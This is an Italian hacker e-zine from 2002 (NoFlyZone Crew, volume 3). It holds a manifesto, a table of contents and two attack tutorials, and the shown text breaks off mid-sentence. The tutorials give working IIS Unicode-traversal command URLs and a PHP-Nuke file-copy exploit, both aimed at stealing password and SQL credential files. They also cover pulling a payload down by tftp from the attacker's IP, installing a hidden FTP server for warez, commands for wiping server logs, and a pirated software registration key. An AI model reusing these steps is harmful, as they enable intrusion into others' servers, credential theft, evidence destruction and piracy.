			==============================================
			**************No Fly Zone Crew****************
			***************** E-Zine *********************
			***************** Vol. 3 *********************
			==============================================



                  /X\
                //   \\
              //       \*
            //        //|
          //         /  |
        //          |   /
      //            | //    /X\
    //              |/    //   \\
  //         /|     |   //       \*
 X         // |     | //        //|
 |\\     //   |     |/        //  |
 |  \\ //    /|             //    /
 |    *    // |           //    //    /X\
  \\  |  //   |         //    //    //   \\
    \\|//   //         /    //    //       \
      X    *         //   //    //          X\
           |\\     //    /    //             \\
           |  \\ //    //   //         /       \
           |    *    //   //         //|\\      \\
            \\  |  //   //          X\ |  \\     /*
              \\|//   //              \|    \\ // |
                \    *         /|\     /*\    *   |
                     |\\     // | \\ // | \\  |  //    /X
                     |  \\ //   |   *   |   \\|//    //  \\
                     \    *    / \  |  /|           *      \\
                      \\  |  //   \\|//             |\\      \\
                        \\|//       X               |  \\      \\
                                                    \\   \\      \\
                                                      \\   \\      \\
                                         /--------------------       *
                                       //                          //|
                                      |\                         //  |
                                      | \\     ------------------| //
                                      \\  \\      \\             |/
                                        \\  \\      \------------*
                                          \\  \\      \\
                                            \\  \\     /*
                                              \\  \\ // |
                                                \\  *   |/
                                                  \\| //
                                                    +/



===============================================================================
-------------------------------[E-Zine No 3]-----------------------------------
===============================================================================


Member of the NoFlyZone crew are: []LoRd[V]icio[],Crashes,[D]kl,CityHunter,
				  goony,pex3,Quasar,[Evil],R|Ppy,
                                  Capitanmidnight,Pregzt,[V]lad,anetrip


===============================================================================
-------------------------------------------------------------------------------
------------------------------[Menu Articoli]----------------------------------
-------------------------------------------------------------------------------
===============================================================================
----------[INTRO]--------------------------------------------------------------
===============================================================================


0.......Manifesto...............................by NoFlyZone Staff
1.......Intro...................................by NoFlyZone Staff

===============================================================================
----------[Hacking]------------------------------------------------------------
===============================================================================

2.......Hacking Pub (Unicode)...................by R|Ppy
3.......Hackerare un server.....................by []Lord[V]icio[]&[V]lad
4.......Nessus..................................by pex3
5.......PHP-Nuke exploits.......................by [V]lad
6.......H@ckS@t.................................by [V]lad
7.......Creare una backdoor #3..................by Crashes
8.......Operazioni in una Linux-box.............by Ov3rSyS
9.......PASV mode e FlashFXP....................by R|Ppy
10......Farsi un Firewall in VB.................by Evil

===============================================================================
----------[THEORY]-------------------------------------------------------------
===============================================================================

11......Spoofing vedente........................by CityHunter
12......Shell...................................by Evil
13......mIRC Scripting #1.......................by Evil
14......Connessioni criptate in SSH.............by []Lord[Vicio[]
15......Proxy/Socks.............................by Advanced
16......Ping?Pong...............................by Advanced

===============================================================================
----------[PROGRAMMAZIONE]-----------------------------------------------------
===============================================================================

17......Perl #1.................................by []Lord[V]icio[]
18......Raw Socket..............................by CityHunter
19......PHP.....................................by pex3
20......C #1....................................by Quasar
21......C #2....................................by Quasar
22......Puntatori in C..........................by CityHunter
23......Perl #2.................................by []Lord[V]icio[]
24......Puntatori in C++........................by Quasar
25......Basi SQL................................by []Lord[V]icio[]

===============================================================================
----------[Misc]---------------------------------------------------------------
===============================================================================

26......IPFilter on BSD.........................by goony
27......ADSL on Linux...........................by [V]lad
28......Win & Linux in rete.....................by []Lord[V]icio[]
29......Applicare patches ad OpenBSD............by goony
30......LILO....................................by Crashes
31......C++ Tricks & tips.......................by [V]lad
32......Registry edit...........................by Evil


===============================================================================
----------[News & Scritti da Voi]----------------------------------------------
===============================================================================

33.....Winsock..................................by endsub
34.....Crittografia 4 dummies...................by [$]wiT
35.....Sistemi di intercettazione e privacy.....by Boss Fox
36.....Lettore CD #1,2,3........................by Evilcry
37.....MIME 1.0 e gli attach nella posta........by roxyy 
38.....Linguaggio C.............................by MADlineDIE 
             
===============================================================================
----------[Source]-------------------------------------------------------------
===============================================================================

39....Raw Socket Implementation.................by CityHunter
40....Sauron....................................by CityHunter
===============================================================================
41....Greetings.................................by NoFlyZone Staff
-------------------------------------------------------------------------------

Mode E-Zine on:

Prima di tutto xò:

===============================================================================
DISCLAIMER:
Tutto il materiale pubblicato in questa zine è di pubblico dominio.
A scopo educativo e di ricerca. Gli autori non si assumono alcuna responsabilità
per l'uso di ciò che viene spiegato e di eventuali danni.
Consigli x l'uso: accendere il cervello. (lo trovate in /dev/brain n.d.pex3)
===============================================================================

------------------------------[Manifesto]--------------------------------------
---------------------------[NoZlyZone Staff]-----------------------------------


Questo è un puro groviglio di pensieri,
scaturiti da una mente fatta di bit e sinapsi
che si interfacciano ad un corpo che non ha esistenza.
Nessuno ha forma.
La forma è una limitazione, noi la superiamo.
Nasciamo, cresciamo ma non moriamo,
in un mondo in cui si può nascere 1,10,100 volte al giorno
e si continua a crescere.
La ricerca infinta di conoscenza.
Riuscire ad arrivare al tutto,
conoscere ogni bit del Tutto digitale ed elevare così
il proprio IO mentale.
Che bello questo mondo.
I cristalli liquidi del nostro portatile che ci illuminano
la non-faccia proiettando la nostra mente
al di là del velo di Maya, oltre Matrix,
arrivare nel mondo reale.
Quello vero.
Non per tutti.
Per noi lo è.
Lo è perchè è più affascinante, coinvolgente...nostro.
Un mondo buio, che lancia spiragli di luce alle nostre menti attraverso pacchetti,
si lascia interpretare,
ma occorre avere la chiave di decriptazione.
L' intelligenza.
Quella che permette a noi di attraversare il velo che ci ricopre la retina.
Ascoltate:
le nostre dita che battono sulla tastiera, nostra naturale protesi,
emettono un suono incantevole
che ci porta sempre più in là, oltre il buio,
imprigionati nella rete.
Scelta nostra.
Come ogni cosa facciamo.

Cerchiamo la verità, e la troveremo.
 

CityHunter
*NoFlyZone Staff*

--------------------------------[INTRO]-----------------------------------------
---------------------------[NoZlyZone Staff]------------------------------------

Finalmente questo attesissimo numero 3 !! Penso sia davvero un buon numero!
Abbiamo lavorato tanto ma ci sentiamo ben appagati.Ci sono state molte perplessità 
in questo periodo, ho pensato spesso di kiudere tutto,ma fortunatamente i miei 
amici e compagni di lavoro me lo hanno "impedito" .. hanno fatto davvero bene,ma 
questo mi ha fatto capire quanto sia importante quello ke facciamo: noi lavoriamo 
x voi, x diffondere conoscenza e anche x imparare insieme a voi lettori. In questo 
periodo ho visto nascere altre e-zine, altre crew e mi sono scoraggiato, ho pensato 
ke noi siamo solo un gruppo come tanti altri,ma mi sbagliavo...ho subito notato 
la differenza...Noi nn siamo solo una crew come tante altre, siamo principalemente 
un gruppo di AMICI , a cui piace davvero quello ke facciamo e principalemente ci 
divertiamo nel farlo. Vi invito a leggere il primo numero della nostra e-zine e 
subito dopo date un'altra okkiata a questo e capirete quanto  siamo cresciuti, 
quanto siamo  migliorati, quanto abbiamo studiato e quanto crediamo e ci impegnato 
in quello ke facciamo. 
Volevo ringraziare tutti .. tutti gli amici ke frequantano il nostro 
chan ufficiale #NoflyZone , tutti i membri della crew e tutti quelli ke ci aiutano
nel realizzare questo nostro sogno. Questo sarà l'ultimo numero della noflyzone in 
vekkio stile...dal prossimo numero noterete la differenza di qualità..ci impegneremo 
ancora di + e principalemente STUDIEREMO di + .. xkè ricordate ke c'è sempre da 
imparare...Prima di lasciarvi in pace e farvi leggere qualke articolo volevo rendervi 
partecipi di un mio piccolo sfogo...Ci sono tantissime altre crew ed altre e-zine e 
volevo precisare ke nn siamo in competetizione con nessuno ... volevo incoraggiare 
tutti nello scrivere x raggiungere una libertà di informazione sempre maggiore ...

							LordVicio
							*NoFlyZone Staff*

---------------------------------*END*-----------------------------------------


===============================================================================
-------------------------------------------------------------------------------
----------------------------------[HACKING]------------------------------------
-------------------------------------------------------------------------------
===============================================================================

-------------------------------------[2]---------------------------------------
-----------------------------------[R|Ppy]-------------------------------------
--------------------------------[Hacking Pub]----------------------------------

        Éººººººººººººººººººººº»
        Í UniC0d3 - Povero NT Í
	Í     Hacking PUB     Í
        º                     º
        Í by R|Ppy  09/02/02  Í
        ÈºÄÄººÄÄººÄÄººÄÄººÄÄºº¼


                               ##               #
#### #  #  ###      #  # # ## ###   ###  ##   ###  ###
#### #  # ## #      #  # ## #   #  ##   ## # ## # ####
#  # # ## ## #      ## # #  #   #  ##   ## # ## # ##
####  ###  ###       ##  #  #   #   ###  ##   ###  ###
           ##

Sommario:
=========


0x00-Prefazione
0x01-Unicode Bug
0x02-Sfruttiamolo
0x03-Pwdump
0x04-Trigger FTP
0x05-Tool that you need
0x06-How to find Pubs that can be hacked
0x06-Bonux Scan Tutorial
0x07-How to register Serv-u
0x08-Hacking with anonymous connection
0x09-Hacking with Trivial File FTP
0x10-Considerazioni Finali


0x00-Prefazione
===============

Salve a tutti ragazzi eccomi tornato per un altro bel tutorialetto.
Oggi parleremo di come hackare i pub. Il nostro scopo sarà quello di installare un
ftp server privato per mezzo di un demone, chiamato Serv-u ftp Daemon, che ci potrà
servire per i nostri loschi scopi :D . Voi vi starete domandando < ma che cacchio
ci serve una cosa del genere ? > beh semplice con un ftp privato del genere potete
spostare, iso intere di giochi, software, DivX e quantaltro, tra ftp pubblici o
privati sempre che supportino il FXP (vedere guida di riferimento).
Prima però spiegherò un po la questione dell'unicode e di cosa possiamo riuscire a
fare con questo buggo firmato by Microzoz ;)


/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\

Ringraziamenti e Saluti: a []LoRd[V]icio[] - Crashes - Quasar e a tutti i membri
 	  		 della crew

Altri Saluti invece vanno a XPTerminator - Net_DiggEr - Dominus e slupz per i vari
aiuti ricevuti nel momento di bisogno ;)

Non dimentico di certo Marsio, BiGaLex, Lord_Goliath e Gr|m (più away che online :DD)

/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\

0x01-Unicode Bug
================

Purtroppo da quando è uscito il magnifico virus Nimda tanti server hanno patchato
il sistema coprendo pure il buco dell'unicode, ma ancora tanti di questi sono
sfruttabili.

tramite la seguente stringa possiamo fare certe cosette:
 - vi darò i pressuposti per capire come scaricare files dal server quali persino
   account ecc. ecc...
 - vari comandi utilizzabili
 - sfruttare la falla http tramite TFtp


0x02-Come sfruttare questo bug
==============================

fiiuhh dai che proseguiamo ;)

Possiamo sostituire in alternativa a DIR (comando dos) pure i comandi copy, del,
mkdir,netstat, e tante altri parametri server sul quale non mi suffermo.
Per es. avete mai pensato di fare un dir su sulla root del C, e poi pensare di
fottere gli user e pwd? IF no goto A if yes goto B A e B: dobbiamo spostarci nella
directory /winnt/repair/ e pescare il file sam, grazie al nostro buggetto se
presente un ftp anonimo su quell'ip possiamo copiare questi files attraverso il
comando copy nella cartella del web che è solitamente \inetpub\ftproot\. Poi
collegandoci con tramite ftp da linux o un cliente ftp da windoz scarichiamo e poi
cancelliamo i files. Ricordiamoci pure magari di modificare i log del sel server ftp
ed http che trovate in /winnt/system32/Logfiles/ per gli ftp il nome della DIR è
questa: MSFTPSV per il web il nome della DIR è questa: W3svc
potremmo quindi copiare i due files log web e ftp nella ftproot scaricarli modificarli
tagliando i nostri interventi su entrambe le porte 21 e 80 e riupparli e copiarli sul
path originale /winnt/system32/Logfiles/ ;)))

Avete capito!!!! SPero di si, anche perche non so come spiegarlo in altre parole :D

P.S. non sempre va dipende dalle impostazioni del server.

ESEMPI PRATICI
==============


STRINGA: http://[server]/scripts/..%255c..%255cwinnt/system32/cmd.exe?/
	 c+[comando]+c:\

è la stringa di default io ne ho provati parecchi e la maggior parte circa un 70%
funziona con questa stringa. cmq cambiamola inserendo qualche valore


STRINGA: http://[IP]/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\

Farà un dir sul percoso c:\
oppure per copiare un file sostituiremo l'ultima parte con /c+copy+c:\pippo.zip
d:\temp\

Per eseguire un software invece in background che non si veda
http://[IP]/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+c:\programma.exe /h

Suggerimenti ricordatevi che in alcuni server la directory script si trova sotto
Inetpub\Scripts e che difficilmente troveremo questo baco su siti famosi o importanti
però non si sa mai :D
We can try.


0x03-Usiamo il SAMdump
======================


il passo successivo:

usare il SAMdump o simili. Questo software lo peschiamo generalmente dalla rete nei
siti come il solito e mitico PacketStxxxx con questo possiamo trovare la pwd
prensente nel file SAM (Service Account Manager).

0x04-Trigger FTP
================

Usare TFtp (Trigger FTP)
Questo è un altro baco che risiede prevalentemente su server non recenti, ma come ben
sappiamo sono ancora tanti quelli bacati, colpa dei SysAdmin stupidi che non patchano
il sistema. Tramite un client Tftp che potete trovare nei siti che sapete voi è
possibile uppare e downloadare files senza essere loggati ;) figo no, con questo
immaginate cosa è possibile fare, praticamente quasi tutto, però c'è anche l'altra
faccia della medaglia.
Non è supportato da tutti i server :( percui l'importante è provare provare e
riprovare.
Dai tanto di tempo ne abbiamo tutti dico bene!!! hihihi


0x05-Tool that you need
=======================


I files che hai bisogno for pub hacking:


1.	Serv-u.exe   -----> Serv-u Server Versione 2.x oppure 3.
2.	Serv-u.ini   -----> Serv-u Server Configurazione
3.	Tlftpd32.exe -----> Versione per windows del Tftp
4.	kill.exe     -----> Killa i processi di NT tramite dos
5.	Tlist.exe    -----> Lista dei processi attivi in NT da dos
6.	Ncx99.exe    -----> Software che buca il telnet
7.	login.txt    -----> Script di base del login, modificabile





0x06-How to find Pubs that can be hacked
========================================

I pub gli possiamo trovare facendo degli scan con il software Grimp's ping vedi altra
guida "Scan Pubs", poi abbiamo due strade, dobbiamo verificare la presenza della
vulnerabilità unicode sui i server microsoft scannati, o lo facciamo manualmente cosa
molto lunga, faticosa, ma divertente, oppure ci scarichiamo un programma che verifica
la presenza del bug in automatico ;) (reperibile indovinate un po dove su
Packetxxxxxxx :P )

1.	NT Version 4.0  5.0.
2.	Running IIS 4.0  5.0. (Non pathati)
3.	Vulnerabili a IIS Unicode Bug.

0x06-Bonux Scan Tutorial
========================

Questo è unpiccolo tutorial bonus che spiega come trovare gli ftp pubblici nei quali
possiamo sfruttare la questione dell'unicode spiegata precedentemente. Dobbiamo
scaricare il software Grim's Ping dal sito ufficilae www.grimpings.cjb.net. Dopo
averlo installato correttamente, lanciate il programma ed ora seguite le miei
istruzioni.

Well Impostazioni da apportare al menu Options --> Preferencs Threads.

IF 56k/ISDN goto A
IF ADSL     goto B
IF FATSTWEB goto C

:goto A
valore tra 5 e 10

:goto B
valore tra 20 e 30

:goto C
valore tra 50 e 100

P.S. Equivalgono al numero di connessioni contemporanee

Ora impostiamo l'ip di partenza dal quale il nostro Dr. Grim inizerà. F6 e mettiamo
un ip (la scelta va messa a caso o pensata attraverso il database di ipindex.net
oppure facendo alcune con google pinghiamo alcuni servers dei nostri risultati di
ricerca e partiamo da li :D semplice no ) ad es. 203.15.203.1 poi per aggiungere
altri IP ADD ranges e mettete tipo 1000 ogni ranges corrisponde a 254 ip cioè da
xxx.xxx.101.1 a xxx.xxx.101.254.

Ora potete fare START. Il tempo e vastra connessione faranno il rewsto :) per
verificare se avete trovato dei validi FTP andate su File Anonymous access log oppure
ci sono i log degli IP sul quale è installato un ftp ma non è anonimo o senza
permessi di scrittura. Tutti questi ip risultati accessibili possono essere bacati
dal nostro amico UNICODE bud su server microsoft ovviamente, UNIX ovviamente no :)
chissa come mai ;)


0x07-How to register Serv-u
===========================

nel file.ini editate e dopo

[GLOBAL]
TryOut=Crippled
Version=2.5.8.1

aggiungete: RegistrationKey=IstOMpTMlDg,PaRKeR [tNO '00],The Nameless Ones

e sarà registrato

0x08-Hacking with anonymous connection
======================================

Nel caso abbiamo un ftp anonimo creiamo una cartella e copiamo il file il file
serv-u.exe e .ini poi successivamente con il nostro browser copiamo i files dalla
cartella dell'ftproot solitamente in c:\inetpub\ftproot\ in una cartella inboscata
per bene (nascosta 8) ) altrimenti dobbiamo cercarla nel server, penso che sappiate
usare il comando dir/s ;)
Per caricare il servizio del serv-u FTP utilizziamo questa stringa:

http://[IP]/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+c:\Inetpub\ftproot\tmp\
servu-ftp.exe /u /h C:\Inetpub\ftproot\tmp\servu-ftp.ini

Questo è un esempio naturalmente cercate di cammuffare pure i nomi dei files.


0x09-Hacking with Trivial File FTP
==================================

In questo caso, di ftp non accessibili usiamo un bel trucchetto, il Trivial File FTP.
con una piccola utility di Packetxxxxxx lanciamo il TFTP32 --> settings e inseriamo il
path dove andarà a pescare i nostri file ad es: c:\yes\ poi OK (cacchi oche palle
forse sono troppo dettagliato ;) scusate, vabbè portate pazienza ho quasi finito :P )
Usiamo questa stringa per trasferire il nostro file dal nostro c:\yes ad una cartella
del server remoto ricordate che GET (è il nostro upload) e PUT (il nostro download),
vi fa venire in mente qualcosa ?? non aggiungo altro

http://IP/scripts/..%255c..%255cwinnt/system32/tftp.exe?+IL TUO IP+GET+tuonome.exe+
c:\inetpub\scripts\tuonome.exe

e poi eseguito lo stesso passaggio di prima per caricare il servizio ;)




0x10-Considerazioni Finali
==========================

Dovete tener presente anche questa questione: e se installassi un bot per irc, o un
ftp o un piccolo server remoto dove possa accedervi soltanto io..... embe con l'iter
svolto per voi avete le basi, il resto è solo frutto della vostra immaginazione e
fantasia ;)

NOTA BENE: ricordatevi sempre di rimanere anonimi, e cmq potete farlo semplicemente
attivando dal browser piu proxy concatenati oppure utilizzando software specifici
tipo multiproxy o a4proxy.

P.S. mettondomi dalla parte del SysAdmin voglio semplicemente dire che installando
tutti i service pack usciti per la versione 4 e 5 di NT server si risolvono questi
piccoli incovenienti ;D  (ci mancherebbe, con quel che costano! :P , n.d.pex3)


byez Un saluto a tutti

Fuck Deleters - the Lame - and ... STOP, no nothing stop, and Sometimes
my mother :DD it's right, she is


See yaaaaaaaaaaaaaaaaaaaaaaa

__________
R|Ppy

mailto:rippy2k1@hotmail.com


(c) Copyright 2002


------------------------------------*END*--------------------------------------

-------------------------------------[3]---------------------------------------
-------------------------[ []Lord[V]icio[] & [V]lad ]--------------------------
-------------------- --------[Hackerare server]--------------------------------


       		..::[](LoRd[V]icio)[]::.. & ..::[V]lad::..
	       	           ......presents......
                  	 */\*NoFlyZone Crew */\*
                  	www.noflyzone-crew.cjb.net

         	       "" :P Hackerare Server P: ""



-------------------------------------------------------
| Non ci riteniamo responsabili di come utilizzerete  |
| le informazioni contenute in questa guida in quanto |
| offerte da noi a puro scopo informativo!!           |
-------------------------------------------------------



Nn so xkè mi sono deciso a scrivere tale lamerata .. fra
tutte le ipotesi spicca quella di nn farmi fracassare
le ***** da tutta quella gente che fa domande idiote...


                         |-----|


                  [][F]oot[P]rinting[]


Poniamo il caso .... ti prefiggi lo scopo di "defacciare"
"bucare" "hackerare" (nn fa differenza) un determinato sito
magari xkè il webmaster o magari l'admin lo vedi troppo
impegnato a squillare la tua ragazza , a farle sdolcinate
kiamate , lasciando incustodito il suo bel sito ....
Alto 1.80 x 80 kili capisci ke .... emmm ... ci siamo capiti,
ce la prendiamo con il suo sitozzo .. arrrgg ..

Questa giuda si dividerà in 2 parti... la prima analizzerà
l'hacking da windows,la seconda l'hacking da macchine unix.

La prima cosa da fare in un attakko è il FootPrinting!!


Cos'è??

Ma come!! Allora: il footprinting permette all'hacker di
ottenere + informazioni possibili sul server che si vuole
attaccare e include scansioni verso la vittima di + tipi.
Direi che il primissimo passo nel footprinting è fare un
bel dns all'host della vittima.

Come si fa ??

Ke tristezza ... + scrivo questa guida .. + mi viene da pik-
kiare la testa contro il monitor .. cmq .... Allora
(terra-terra) se siete in irc date il comando
/dns www.sitodelpalestrato.it vi darà il corrispettivo ip
... nn usate irc ? ma Rotfl ... allora prendetevi uno schifo
di tools .. un portscanner .. tutte quelle cose ke scaricate
senza il motivo es: SamSpade ... netinfo ....
oppure semplicemente usate il ping!

ping www.sitodelpalestrato.it

Una volta ke abbiamo l'ip .. lo scanniamo e cerchiamo di
ricavare + informazioni possibili ...

Scanner consigliati :
SSS: ( nn è un semplice portscanner , usa dei plugins nn vi
indica solo le porte aperte ma anke gli eventuali bug
explottabili )
("quasi" all'altezza del "mitico" nessus, quasi ho detto...
 e lo potete trovare nel sito: www.rsh.kiev.ua, n.d.pex3)

SuperScann il corrispettivo ,
Nmap in Win32 ... booh www.google.it ;),

Stealth: per win...trova le vulnerabilità nell'http
(cgi,php,bug server,ecc...)
(lo trovate nel sito: www.hideaway.net, n.d.pex3)

Ricordate che è bene fare anche whois finger ecc
(sempre se è possibile).

Prima di scaldare l'nmap direi che è bene introdurre i
vari tipi di scansione...:
(per l'utilizzo di nmap vi rimando al numero 2 di nfz-zine,
l'articolo lo ho scritto io, n.d.pex3)

TCP connection scan:
Questa procedura è la + semplice... lo scanner si
connette normalmente alle porte della vittima e
cerca quelle aperte... però è la + rintracciabile.


TCP SYN scan :
Chiamata anche scansione semi-aperta la scansione non fa
altro che inviare un pacchetto syn alla porta della vittima
e attende una risposta. Questa tecnica è + invisibile
e molte volte nn viene registrata dal target


TCP FIN scan:
Questa invia un pacchetto fin... trovate documentazione
nella rfc 793

TCP Xmas Tree Scan:
Tale tecnica invia un pacchetto FIN, URG e PUSH...
idem sopra per
eventuali documentazioni...

UDP scan:
Questa scansione risulta + lenta rispetto alle precedenti...
personalmente sconsiglio il suo utilizzo tranne che in
occasioni particolari.

TCP/IP fingerprinting:
questa tecnica, molto particolare, ideata dall'inventore di nmap,
consiste nell'identificazione del sistema remoto sfruttando un'insieme
di regole che analizzano le porte aperte, le risposte date dai vari demoni
e le loro versioni, che nella maggior parte dei casi sono sufficienti a
determinare il sistema operativo della macchina remota.
(mah... diciamo che confronta gli stack tel tcp/ip in risposta alle
scansioni, che varia da o.s. a o.s. ed è causato dalla diversa
implementazione delle rfc, ma non sempre è affidabile, esistono patch per
simulare la presenza di un altro sistema operativo... anche i banner possono
essere cambiati ;), n.d.pex3)
Questo è ciò che accade con l'opzione -O di nmap.

Bene... dopo queste delucidazioni potete iniziare a scaldare
il nostro scanner ...il nostro target sarà :

[bash]# nmap -sS -O www.sitopalestrato.com

Port       State       Service
21/tcp     open        ftp
25/tcp     open        smtp
49/tcp     open        tacacs
80/tcp     open        http
98/tcp     open        linuxconf
135/tcp    open        loc-srv
280/tcp    open        http-mgmtOK
443/tcp    open        httpsnn
465/tcp    open        smtpsO.S
593/tcp    open        http-rpc-epmaptools
1030/tcp   open        iad1
2000/tcp   open        callbook
2002/tcp   open        globe

Remote operating system guess: Windows NT4 / Win95 / Win98

Facendo quache altra ricerca
(telnettandosi alla 21 e alla 80) troviamo:

web server ---------> IIS 4.0 (microsoft rulez)
FTP --------->  220 dbserver Microsoft FTP Service.

Che culo ! il solo fatto ke sia tutto targato Microsoft
è tutto stupendo ...in quanto il vecchio Bill non sebra dare
molta importanza alla sicurezza...

Prima di procede eccovi un piccolo glossario:

Banner = Avete presente quel msg ke vi spunta appena
loggati alla porta 21 indicante il servizio offerto ?
Quello è il banner

Exploit = Sono applicazioni scritti con linguaggi
di programmazione (c,c++,perl,assembly...) che aiutano
noi hacker ad avere accesso al server
(ma rotfl... adesso il vicio si autoproclama pure
hacker, n.d.pex3) 

Bug = Falle in un sistema o programma ke permette di
averne pieno accesso 


OKI!!! Ora avete tutte le info possibili... cercate exploit o
documentazione su :

www.packetstormsecurity.com
www.neworder.box.sk
www.securityfocus.org
www.google.com (sempre utile) ;)
www.pex3.com/exploit  (immancabile, n.d.pex3)

E passiamo alle cose + serie :

Ma xkè ti stai fossilizzando sulla 21 ?

La porta 21 è il servizio FTP , lo stiamo controllando x bene
xkè il 50% dei deface sono causa dei bug DElla 21 ... xke una
volta entrati abbiamo accesso a tutto il materiale prensente nel
sito .. possiamo downloadare,uplodare,cambiare pagine HTML ;)



-----------------------------------------------------------------
| Come abbiamo visto ci sono diverse porte aperte oltre la 21,  |
| prima di spiegare tutto dettagliatamente nn scordate ke x     |
| ottenere diritti di aministratore (root) nn necessariament    |
| bisogna sfruttare i bug del O.S .... Quando avrete finit      |
| il visto scann vi consiglio di dare un okkiata al sito        |
| vero e proprio .. dovete vedere se fatto (programmat          |
| in ASP , PHP , MYSQL , CGI  ... Questi linguaggi di proggram- |
| mazione WEB se nn scritti bene,posso causare dei buG e quindi |
| permettere alla gentile clientela di farne largo abuso ;)     |
-----------------------------------------------------------------



Andiamo con i soliti esempi :


Scann Ai CGI :

www.sitopalestrato.it:80

error "count.c"
error "multihtml.c"


Controllo BuG vers. PHP :
PHP NUKE 4.0

                     |-------------|



Spero di nn stare facendo troppa confusione ....
riassumiamo il tutto ....

Allora il sito del palestrato dopo un attenta okkiatina
abbiamo visto ke Gira SU IIS 5.0 , ke è scritto in PHP ,
ke usa CGI , ke ha diverse porte aperte tra la cui la 21 (FTP)
ke è explottabile ......

Iniziamo facendo qualke piccolo TEST ...
Dopo aver cercato in rete ogni minima informazione ,
abbiamo raccolto diversi exploit e qualke stringa da
lanciare dal Browser :)

Prima di fare qualke cazzata vi dò il concetto di anonimità :
Quando ci colleghiamo ad un sito , quello logga , registra il
nostro IP e le nostre operazioni (anche se semplicemente
visualizzate la index...), la cosa nn è molto piacevole ...
Quindi il nostro ip nn deve essere presente .. uaz uaz ..

Se volete hackerare dal Browser (cosa molto ma molto poco pro-
fessionale .. e raramente possibile) vi basta* un proxy koreano :)

* basta = ho scritto una cazzata enorme quanto una casa ..
nn esiste la piena anonimità .. è tutto al 50% di fortuna e
sfortuna mi dispiace scoraggiarvi .. nel senso ke se l'NSA vi sta
controllando credo ke siano poche le persone in grado di nn farsi
beccare !(capito il concetto ? ) ... ritornando a noi  ..
i proxy li potete settare dalle propietà di connessione e ne
troverete parecchi e anonimi in www.multiproxy.org ... se dovete
lanciare un exploit fatelo da una shell .. se x procurarla dovete
registrarvi fatelo con dati falsi e sotto wingate mentre se già
l'avete connettevi alla vostra shell sempre sotto un bel Sock,Kiaro ?


Qua elencherò diversi tutorial dove trovare informazioni a riguardo :

http://members.xoom.it/nfzkrew/tutorial/tutdkl.txt
http://members.xoom.it/nfzkrew/tutorial/proxy%20and%20socks%20scanning.txt


Adesso Passiamo alla pratica :

*Ci ritroviamo con 2 bug CGI :

count.c ---------> http://www.20cn.net/hack/exploits/daemon/httpd/cgi/execute/count.c
multihtml.c -----> http://www.20cn.net/hack/exploits/daemon/httpd/cgi/execute/multihtml.c

Con una semplice ricerca abbiamo trovato due semplici exploit ......
Compilateli e via ! ;)

*La versione del PHP explottabile :

Tutte le versioni di phpnuke sono vulnerabili, ad eccezione di
'phpnuke 5.0 RC1'.Il bug in questione permette di eseguire il comando
'cp' su qualsiasi file della box, oltre ad uplodare files sul server.
Vuoi ottenere l'account sql ?
Semplice !
http://www.server.net/admin.php?upload=1&file=config.php&file_name=
hacked.txt&wdir=/images/&userfile=config.php&userfile_name=hacked.txt
verrà visualizzata la pagina di 'login' al pannello di amministrazione,
dopo che sia stato copiato il file 'config.php' in 'images/hacked.txt'.
Ora non devi fare altro che leggere il file
http://www.server.net/images/hacked.txt
il quale contiene il source code di 'config.php'
[che non viene interpretato, in quanto è un file txt]...
che, come tutti sanno, contiene [tra le altre cose] l'account al server sql.

*220 dbserver Microsoft FTP Service :

Dopo una ricerca in packetstorm ho trovato circa 45.830.580 exploit ;)

http://209.100.212.5/cgi-bin/search/search.cgi?searchvalue=220+dbserver+
Microsoft+FTP+Service&%5Bsearch%5D.x=10&%5Bsearch%5D.y=4

Basta solo cercare ... nn troverete mai tutto bello pronto ;)


I log ? come levarli ?


Cosa sono i log files:

I log files sono dei files di testo, di cui alcuni in formato binario,
che loggano tutte le azioni che un utente svolge sul sistema,
quindi loggano anche le malefatte degli hackers;
il sysadmin li va a guardare subito se trova qualcosa di sospetto quindi è
meglio manometterli prima di andare a nanna dopo il fattaccio.
Funzionano secondo la configurazione del syslogd, un demone che li
gestisce, e che quindi l'hacker deve andare a sbirciare per primo.
C'è da dire inoltre che ogni tipo di attacco non lascia le sue tracce
su tutti i log files: es. se usate un attacco cgi-bin, il sendmail o
simili le tracce, oltre che sui log comuni, si troveranno anche su quelli
dell'httpd ("d" sta per "demone").
Passiamo dunque alla pratica...

PREMESSA : cancellare i log , nn è sempre una impresa facile
come da molti descritta , x farlo nn basta accedere al sistema
ma avere diritti di Administrator.

Un server IIS tiene "usualemente" i suoi log nella cartella
c:\System32\LogFiles
(se non li trovate cercate anche in d:, e:, ecc... ,n.d.pex3)

Dopo aver ottentuo una lista dei log .. svogliamo diverse operazioni.

1 find /V "151.20.0.1" > temp
Così cerchiamo le righe contenenti il nostro ip

2 del c:\WINNT\System32\W3SVC3\in000732.log
così con il comando < del > cancelliamo il seguente log

3 move temp c:\WINNT\System32\W3SVC3\in000732.log
Sostituisce il seguente file con uno temporaneo privo delle nostre traccie

Parlando di sistemi windows ( 2 p*ll* ) il file dei log è in esecuzione da
inetinfo.exe , quindi dopo aver cancellato i log basta killarlo e poi
riavviarlo c:\WINNT\SYSTEM32\inetsrv\inetinfo.exe

(io lo killerei prima di accedere ai log, per ben due motivi:
1. probabilmente, anzi di sicuro, non ti lascia modificarlo se è già in uso
   da un altro processo;
2. così facendo siamo sicuri, si spera :-P, che non saremo loggati durante
   questa azione.
n.d.pex3)

                         |---------------|



************************     2 Parte       ***************************


-----------------Hackerare da linux server *unix----------------------


Nn voglio essere ripetivo , la teoria è la stessa ; passiamo
subito alla pratica !!!

Scann ***

Nmap , Nessus , Satan ... diamo un okkiata a questi 3 programmini ;)
(ottimi anche sans,sara e saint, tre ottime implementazioni del satan,
e magari anche più aggiornate :-), n.d.pex3)

Nmap = E' davvero il miglior portscanner! Grazie all'opzione -O identifica
       anche il sistema operativo della vittima.
(non sempre è attendibile, ovvero: non fidatevi ciecamente di nmap, esistono
lkm che modificano lo stack tcp/ip... a proposito: anche i banner sono
modificabili così come possono essere "simulate" vulnerabilità inesistenti..
n.d.pex3)

Nessus =  Il miglior Security Scanner in circolazione, per maggiori info
